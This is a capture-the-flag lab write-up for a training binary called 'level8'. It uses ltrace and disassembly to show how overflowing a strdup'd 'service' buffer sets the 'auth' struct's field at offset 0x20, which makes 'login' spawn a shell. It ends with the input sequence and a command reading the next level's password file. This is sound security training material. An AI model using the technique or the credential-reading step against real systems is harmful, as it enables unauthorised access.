We run the program

./level8
(nil), (nil)

Infinity loop, I think the progra; wait 2 parameters

$> ltrace ./level8
__libc_start_main(0x8048564, 1, 0xbffff7d4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                = 14
fgets(test test
"test test\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                = 14
fgets(truc truc
"truc truc\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                = 14
fgets(

The program wait 2 parameters because printf try to print these arguments

If we cat the program ce can see :
auth resetservicelogin/bin/shPassword:

ltrace ./level8
fgets(auth test
"auth test\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
malloc(4)                                                        = 0x0804a008
strcpy(0x0804a008, "test\n")                                     = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
)                            = 18

There is a malloc of 4, after, a strcpy in this malloc adress
Reset isn't usefull for us

ltrace ./level8
fgets(auth q
"auth q\n", 128, 0xb7fd1ac0)                               = 0xbffff6b0
malloc(4)                                                        = 0x0804a008
strcpy(0x0804a008, "q\n")                                        = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
)                            = 18
fgets(service q
"service q\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
strdup(" q\n")                                                   = 0x0804a018
printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
)                        = 22

We can see that service use the same pointer that auth. If we try to put service i nfirst, it's not working.
We need to put auth in first argument to launch the malloc
A strdup is call when we put service

Now, see for login:
fgets(login
"login\n", 128, 0xb7fd1ac0)                                                    = 0xbffff6b0
fwrite("Password:\n", 1, 10, 0xb7fd1a20Password:
)                                             = 10

We need a password. We can see in the ASM code, that eax need to be different of null to call system.

   0x080486da <+374>:	test   %eax,%eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>
   0x080486e2 <+382>:	mov    0x8049aac,%eax
   0x080486e7 <+387>:	mov    0x20(%eax),%eax
   0x080486ea <+390>:	test   %eax,%eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	movl   $0x8048833,(%esp)
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
   0x080486ff <+411>:	mov    0x8049aa0,%eax

We test if 0x20 != null. So, the 32th char

ltrace ./level8
fgets(service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"service AAAAAAAAAAAAAAAAAAAAAAAA"..., 128, 0xb7fd1ac0)    = 0xbffff6b0
strdup(" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                    = 0x0804a018
printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
)                        = 22

Now, try without ltrace

./level8
(nil), (nil)
auth a
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
cat /home/user/level9/.pass
